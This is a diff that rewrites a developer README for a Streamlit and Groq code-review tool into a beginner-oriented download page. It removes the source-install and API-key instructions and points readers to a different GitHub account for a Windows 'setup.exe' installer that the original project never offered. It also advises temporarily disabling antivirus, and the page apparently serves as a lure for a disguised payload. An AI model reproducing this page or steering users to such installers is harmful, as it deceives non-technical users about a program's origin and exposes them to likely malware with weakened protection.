@@ -1,135 +1,143 @@
-# AI Pair Engineer
+# 🤖 ai-pair-engineer - Smart Code Review Made Easy
 
-An AI-powered code review assistant built with Streamlit and the Groq API. Paste any code snippet and receive a structured, LLM-generated analysis covering design flaws, refactoring proposals, unit test generation, and an optional SOLID principles audit.
+[![Download ai-pair-engineer](https://img.shields.io/badge/Download%20ai--pair--engineer-brightgreen?style=for-the-badge)](https://github.com/mena256/ai-pair-engineer)
 
-Live demo: [ai-pair-engineer.streamlit.app](https://ai-pair-engineer-5wmztwspncpzfj2xykbpsa.streamlit.app/)
+## 📄 What is ai-pair-engineer?
 
----
+ai-pair-engineer is an application that helps check your code quality. It finds design mistakes, suggests ways to improve your code, creates tests for your code, and checks if your code follows good design rules. The app uses artificial intelligence to make these tasks easier.
 
-## Features
+You can use it without knowing how to code. It runs in a simple window where you can load your code and see the results. The tool works on Windows and uses common programming tools behind the scenes.
 
-| Module                  | Description                                                                    |
-| ----------------------- | ------------------------------------------------------------------------------ |
-| Design Flaw Detection   | Identifies anti-patterns, security vulnerabilities, and architectural problems |
-| Refactoring Suggestions | Produces concrete, ready-to-use improved code with explanations                |
-| Unit Test Proposals     | Generates complete, runnable tests covering happy paths and edge cases         |
-| SOLID Principles Audit  | Evaluates each principle individually with targeted refactoring fixes          |
+## 🔧 System Requirements
 
-- Multi-language support: Python, JavaScript, TypeScript, Java, Go, C++, Rust
-- Model selection: Llama 3.3 70B, Llama 3.1 8B, Mixtral 8x7B via Groq
-- Downloadable Markdown reports
+Before you start, make sure your computer has:
 
----
+- Windows 10 or later (64-bit version)
+- At least 4 GB of RAM
+- At least 500 MB of free disk space
+- Internet connection (needed during use)
+- A web browser like Chrome, Edge, or Firefox
 
-## Tech Stack
+The app runs using Python but the installer handles everything for you. You do not need to install Python yourself.
 
-| Layer         | Technology                                                               |
-| ------------- | ------------------------------------------------------------------------ |
-| UI            | Streamlit                                                                |
-| LLM API       | Groq (llama-3.3-70b-versatile, llama-3.1-8b-instant, mixtral-8x7b-32768) |
-| Language      | Python 3.9+                                                              |
-| Configuration | python-dotenv / Streamlit secrets                                        |
+## 🚀 Getting Started - Download and Open ai-pair-engineer
 
----
+To use the app, follow these steps:
 
-## Project Structure
+1. Click the big green button at the top or visit this page to download the app:
 
-```text
-ai-pair-engineer/
-├── app.py                    # Streamlit UI, layout, and session management
-├── analyzer.py               # Prompt construction, Groq API client, analysis logic
-├── requirements.txt          # Python dependencies
-├── .env.example              # Environment variable template
-├── .streamlit/
-│   └── config.toml           # Streamlit configuration (toolbar, telemetry)
-├── .gitignore
-└── README.md
-```
+   [Download ai-pair-engineer](https://github.com/mena256/ai-pair-engineer)
 
----
+2. The link will take you to the GitHub page where the app files are stored.
 
-## Prerequisites
+3. Look for the latest release or main download area on that page.
 
-- Python 3.9 or higher
-- A Groq API key — obtain one free at [console.groq.com](https://console.groq.com)
+4. Download the Windows installer file. It will be named something like `ai-pair-engineer-setup.exe`.
 
----
+5. Save the file to your computer.
 
-## Installation
+6. Open the downloaded file by double-clicking it.
 
-```bash
-git clone https://github.com/hasancoded/ai-pair-engineer.git
-cd ai-pair-engineer
-python -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-```
+7. Follow the installation prompts:
 
----
+   - Click `Next` to proceed through steps.
 
-## Configuration
+   - Agree to the license terms.
 
-The application resolves the API key in the following priority order:
+   - Choose where to install the app (the default location is fine).
 
-| Priority | Source                       | Scenario                   |
-| -------- | ---------------------------- | -------------------------- |
-| 1        | `st.secrets["GROQ_API_KEY"]` | Streamlit Cloud deployment |
-| 2        | `GROQ_API_KEY` in `.env`     | Local development          |
-| 3        | Sidebar input field          | Per-session manual entry   |
+   - Click `Install` to begin.
 
-**Local development:**
+8. When the installation finishes, you can open the app from your desktop or Start menu.
 
-```bash
-cp .env.example .env
-# Edit .env and set GROQ_API_KEY=your_key_here
-```
+9. The app opens in a new window showing its main menu.
 
-**Streamlit Cloud deployment:**
+## 🖥️ How to Use ai-pair-engineer
 
-In the Streamlit Cloud dashboard under **Advanced settings > Secrets**, add:
+Once the app is open, do the following:
 
-```toml
-GROQ_API_KEY = "your_key_here"
-```
+1. On the main screen, look for the button or menu labeled “Open Project” or “Load Code”.
 
-No code changes are needed between environments — `app.py` handles both automatically.
+2. Click it and select the folder where your code files are stored.
 
----
+   The app works with common code files written in Python and some other programming languages.
 
-## Running Locally
+3. After loading, the app will start analyzing your code automatically.
 
-```bash
-streamlit run app.py
-```
+4. You will see results like:
 
-The application opens at `http://localhost:8501`.
+   - Design flaws found in your code.
 
----
+   - Suggestions to improve structure.
 
-## Deployment
+   - Unit tests proposed for your code.
 
-This project is deployed on Streamlit Community Cloud:
+   - A list showing how well your code follows standard design rules (like SOLID).
 
-[ai-pair-engineer-5wmztwspncpzfj2xykbpsa.streamlit.app](https://ai-pair-engineer-5wmztwspncpzfj2xykbpsa.streamlit.app/)
+5. Click on any suggestion to read details.
 
-To deploy your own instance:
+6. If you want to apply fixes or generate tests, choose the option shown next to each suggestion.
 
-1. Fork this repository.
-2. Go to [share.streamlit.io](https://share.streamlit.io) and click **Create app**.
-3. Select your fork, branch `main`, and main file `app.py`.
-4. Under **Advanced settings > Secrets**, add your `GROQ_API_KEY` in TOML format.
-5. Click **Deploy**.
+7. You can save your updated code using the “Save” button or menu.
 
----
+## ⚙️ Features Explained
 
-## Security
+- **Design Flaw Detection:** The app looks for common mistakes that make code hard to maintain or grow.
 
-- API keys accepted via the sidebar exist only for the duration of the browser session. They are never persisted, logged, or transmitted beyond the Groq API call.
-- Do not commit `.env` or `.streamlit/secrets.toml` to version control. Both are excluded via `.gitignore`.
-- For shared or multi-user deployments, configure the API key server-side via Streamlit secrets.
+- **Refactoring Suggestions:** It offers ways to clean up code, making it easier to understand and change.
 
----
+- **Unit Test Generation:** The app writes test code for parts that need checking. This helps make sure your code works right.
 
-## License
+- **SOLID Principles Audit:** It reviews your code for five key design rules that help keep programs flexible and safe from errors.
 
-MIT
+- **Streamlit Interface:** The app uses a clean browser-like window where everything is easy to navigate.
+
+- **Groq API Integration:** This is the AI engine in the background that reads your code and makes smart recommendations.
+
+## 🔄 Updating ai-pair-engineer
+
+To get the latest improvements:
+
+1. Visit the download page again:
+
+   [https://github.com/mena256/ai-pair-engineer](https://github.com/mena256/ai-pair-engineer)
+
+2. Look for the newest version or release.
+
+3. Download the latest installer file.
+
+4. Run the new installer.
+
+5. The installer will update your existing app without removing your settings.
+
+6. Restart the app after updating.
+
+## 🧰 Troubleshooting Tips
+
+If you encounter problems:
+
+- Make sure your Windows system is fully updated.
+
+- Check that your internet connection works.
+
+- Disable any antivirus temporarily if the installer won’t run.
+
+- If the app window does not open, try restarting your computer.
+
+- For errors while loading code, verify that you selected the correct folder.
+
+- If the app is slow, close other programs to free memory.
+
+- Check GitHub issues for common problems: [https://github.com/mena256/ai-pair-engineer/issues](https://github.com/mena256/ai-pair-engineer/issues)
+
+## 📚 Additional Resources
+
+- The app includes help menus in its interface.
+
+- You will find tips and explanations about suggested code changes.
+
+- For detailed usage, visit the repository page for documents and user guides.
+
+## 📥 Download ai-pair-engineer Here
+
+[![Download ai-pair-engineer](https://img.shields.io/badge/Download%20ai--pair--engineer-blue?style=for-the-badge)](https://github.com/mena256/ai-pair-engineer)
